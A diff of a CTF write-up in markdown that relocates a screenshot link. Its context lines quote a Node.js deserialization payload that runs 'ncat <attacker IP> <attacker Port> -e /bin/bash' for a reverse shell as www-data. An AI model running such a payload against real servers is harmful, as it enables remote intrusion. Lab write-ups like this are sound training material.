@@ -106,10 +106,9 @@ Confirming that the payload works, you can modify the payload to get a reverse s
 _$$ND_FUNC$$_function (){require('child_process').exec('ncat <attacker IP> <attacker Port> -e /bin/bash', function(error, stdout, stderr) { console.log(stdout) });}()
 ```
 
-![image](./images/2024-09-25_18h24_52.png)
-
 Upon injection of the payload above, you will get a reverse shell under the "www-data" user, which will enable you to grab the second flag for the CTF.
 
+![image](./images/2024-09-25_18h24_52.png)
 ![image](./images/2024-09-25_18h35_11.png)
 
 Moving on you can start looking around for a vulnerability/misconfiguration leading to privilege escalation.
